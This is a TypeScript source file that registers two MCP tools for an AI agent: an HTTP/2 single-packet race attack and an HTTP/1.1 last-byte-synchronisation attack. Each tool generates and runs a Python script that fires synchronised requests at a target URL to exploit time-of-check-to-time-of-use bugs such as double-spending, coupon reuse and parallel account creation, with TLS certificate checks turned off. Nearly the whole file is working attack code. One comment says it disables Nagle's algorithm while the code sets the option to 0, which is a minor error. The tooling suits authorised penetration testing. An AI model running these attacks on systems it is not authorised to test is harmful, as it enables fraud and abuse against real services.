/**
 * Race condition testing tools.
 *
 * Implements HTTP/2 single-packet attack and last-byte synchronization
 * for exploiting time-of-check to time-of-use (TOCTOU) vulnerabilities.
 */

import { McpServer } from "@modelcontextprotocol/sdk/server/mcp.js";
import { z } from "zod";
import { runShell } from "../runner.js";
import { randomUUID } from "node:crypto";
import { writeFile, unlink } from "node:fs/promises";

const requestSchema = z.object({
  method: z.string().describe("HTTP method"),
  path: z.string().describe("Request path, e.g. /api/redeem"),
  headers: z.record(z.string()).optional().describe("Additional headers as key-value pairs"),
  body: z.string().optional().describe("Request body"),
});

export function register(server: McpServer): void {
  server.tool(
    "race_single_packet",
    "HTTP/2 single-packet race condition attack. Multiplexes all requests into a single TCP packet so they arrive simultaneously at the server. Used to exploit TOCTOU bugs like double-spending, coupon reuse, parallel account creation. Returns array of responses with status codes.",
    {
      target_url: z.string().describe("Base target URL, e.g. https://example.com"),
      requests: z.array(requestSchema).min(2).describe("Array of requests to send simultaneously"),
    },
    async ({ target_url, requests }) => {
      const scriptId = randomUUID().slice(0, 8);
      const scriptPath = `/tmp/race-sp-${scriptId}.py`;
      const parsed = new URL(target_url);
      const host = parsed.hostname;
      const port = parsed.port ? parseInt(parsed.port, 10) : 443;

      const pyScript = `
import ssl, socket, json
import h2.connection
import h2.config
import h2.events

host = ${JSON.stringify(host)}
port = ${port}
reqs = ${JSON.stringify(requests)}

config = h2.config.H2Configuration(client_side=True, header_encoding='utf-8')
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.set_alpn_protocols(['h2'])

sock = socket.create_connection((host, port), timeout=15)
ssock = ctx.wrap_socket(sock, server_hostname=host)

# Disable Nagle's algorithm for precise packet control
sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 0)

conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()
ssock.sendall(conn.data_to_send())

# Read server preface
data = ssock.recv(65535)
conn.receive_data(data)
ssock.sendall(conn.data_to_send())

# Create all streams and queue frames WITHOUT sending
stream_ids = []
for req in reqs:
    method = req.get('method', 'GET')
    path = req.get('path', '/')
    extra_headers = req.get('headers', {}) or {}
    body = req.get('body', '')

    h2_headers = [
        (':method', method),
        (':path', path),
        (':authority', host),
        (':scheme', 'https'),
    ] + [(k, v) for k, v in extra_headers.items()]

    stream_id = conn.get_next_available_stream_id()
    stream_ids.append(stream_id)

    has_body = bool(body)
    conn.send_headers(stream_id, h2_headers, end_stream=(not has_body))
    if has_body:
        conn.send_data(stream_id, body.encode(), end_stream=True)

# CRITICAL: Flush ALL frames in a single sendall() — single packet attack
ssock.sendall(conn.data_to_send())

# Collect responses
responses = {}
completed = set()
ssock.settimeout(10)

while len(completed) < len(stream_ids):
    try:
        data = ssock.recv(65535)
        if not data:
            break
        events = conn.receive_data(data)
        for event in events:
            if isinstance(event, h2.events.ResponseReceived):
                sid = event.stream_id
                hdrs = {(n.decode() if isinstance(n, bytes) else n): (v.decode() if isinstance(v, bytes) else v) for n, v in event.headers}
                responses.setdefault(sid, {'status': hdrs.get(':status', ''), 'headers': hdrs, 'body': ''})
            elif isinstance(event, h2.events.DataReceived):
                sid = event.stream_id
                responses.setdefault(sid, {'status': '', 'headers': {}, 'body': ''})
                responses[sid]['body'] += event.data.decode('utf-8', errors='replace')
                conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
            elif isinstance(event, h2.events.StreamEnded):
                completed.add(event.stream_id)
            elif isinstance(event, h2.events.StreamReset):
                completed.add(event.stream_id)
        ssock.sendall(conn.data_to_send())
    except socket.timeout:
        break

ssock.close()

result = []
for i, sid in enumerate(stream_ids):
    resp = responses.get(sid, {'status': 'no_response', 'headers': {}, 'body': ''})
    result.append({
        'request_index': i,
        'stream_id': sid,
        'status': resp['status'],
        'body_snippet': resp['body'][:500],
    })

print(json.dumps(result, indent=2))
`;

      await writeFile(scriptPath, pyScript);

      try {
        const res = await runShell(`python3 ${scriptPath}`, { timeout: 30 });
        let responses: any[] = [];
        try {
          responses = JSON.parse(res.stdout);
        } catch {
          responses = [{ raw: res.stdout, stderr: res.stderr }];
        }

        const statuses = responses.map((r: any) => r.status);
        const allSame = new Set(statuses).size === 1;

        const result = {
          target: target_url,
          total_requests: requests.length,
          responses,
          all_same_status: allSame,
          hint: allSame
            ? "All responses identical — race condition may not be exploitable here, or all succeeded (check bodies)."
            : "Different response statuses detected — possible race condition!",
          stderr: res.stderr || undefined,
        };
        return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
      } finally {
        await unlink(scriptPath).catch(() => {});
      }
    }
  );

  server.tool(
    "race_last_byte_sync",
    "Last-byte synchronization race condition attack. Sends all requests minus their final byte, pauses, then sends all final bytes simultaneously. Works over HTTP/1.1 with multiple connections. Returns array of responses.",
    {
      target_url: z.string().describe("Base target URL, e.g. https://example.com"),
      requests: z.array(requestSchema).min(2).describe("Array of requests to synchronize"),
    },
    async ({ target_url, requests }) => {
      const scriptId = randomUUID().slice(0, 8);
      const scriptPath = `/tmp/race-lb-${scriptId}.py`;
      const parsed = new URL(target_url);
      const host = parsed.hostname;
      const port = parsed.port ? parseInt(parsed.port, 10) : 443;

      const pyScript = `
import ssl, socket, json, time, threading

host = ${JSON.stringify(host)}
port = ${port}
reqs = ${JSON.stringify(requests)}

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

def build_raw_request(req):
    method = req.get('method', 'GET')
    path = req.get('path', '/')
    extra_headers = req.get('headers', {}) or {}
    body = req.get('body', '')

    lines = [f"{method} {path} HTTP/1.1"]
    lines.append(f"Host: {host}")
    for k, v in extra_headers.items():
        lines.append(f"{k}: {v}")
    if body:
        lines.append(f"Content-Length: {len(body)}")
    lines.append("Connection: close")
    lines.append("")
    lines.append(body)
    return "\\r\\n".join(lines).encode()

# Build all raw requests
raw_requests = [build_raw_request(r) for r in reqs]

# Open all connections
sockets = []
for _ in raw_requests:
    sock = socket.create_connection((host, port), timeout=15)
    ssock = ctx.wrap_socket(sock, server_hostname=host)
    sockets.append(ssock)

# Send all but last byte on each connection
for ssock, raw in zip(sockets, raw_requests):
    ssock.sendall(raw[:-1])

# Brief pause to let all connections settle
time.sleep(0.1)

# Send last byte simultaneously using threads
barrier = threading.Barrier(len(sockets), timeout=5)
responses = [None] * len(sockets)

def send_last_and_recv(idx, ssock, last_byte):
    try:
        barrier.wait()
        ssock.sendall(last_byte)
        response = b""
        ssock.settimeout(10)
        try:
            while True:
                chunk = ssock.recv(4096)
                if not chunk:
                    break
                response += chunk
        except socket.timeout:
            pass
        responses[idx] = response.decode('utf-8', errors='replace')
    except Exception as e:
        responses[idx] = f"error: {str(e)}"
    finally:
        ssock.close()

threads = []
for i, (ssock, raw) in enumerate(zip(sockets, raw_requests)):
    t = threading.Thread(target=send_last_and_recv, args=(i, ssock, raw[-1:]))
    threads.append(t)
    t.start()

for t in threads:
    t.join(timeout=15)

result = []
for i, resp in enumerate(responses):
    status = ''
    body = resp or ''
    if resp and resp.startswith('HTTP/'):
        first_line = resp.split('\\r\\n')[0] if '\\r\\n' in resp else resp.split('\\n')[0]
        parts = first_line.split(' ', 2)
        if len(parts) >= 2:
            status = parts[1]
        body_start = resp.find('\\r\\n\\r\\n')
        if body_start >= 0:
            body = resp[body_start+4:]
    result.append({
        'request_index': i,
        'status': status,
        'body_snippet': (body or '')[:500],
    })

print(json.dumps(result, indent=2))
`;

      await writeFile(scriptPath, pyScript);

      try {
        const res = await runShell(`python3 ${scriptPath}`, { timeout: 30 });
        let responses: any[] = [];
        try {
          responses = JSON.parse(res.stdout);
        } catch {
          responses = [{ raw: res.stdout, stderr: res.stderr }];
        }

        const result = {
          target: target_url,
          total_requests: requests.length,
          technique: "last-byte-sync",
          responses,
          stderr: res.stderr || undefined,
        };
        return { content: [{ type: "text" as const, text: JSON.stringify(result, null, 2) }] };
      } finally {
        await unlink(scriptPath).catch(() => {});
      }
    }
  );
}
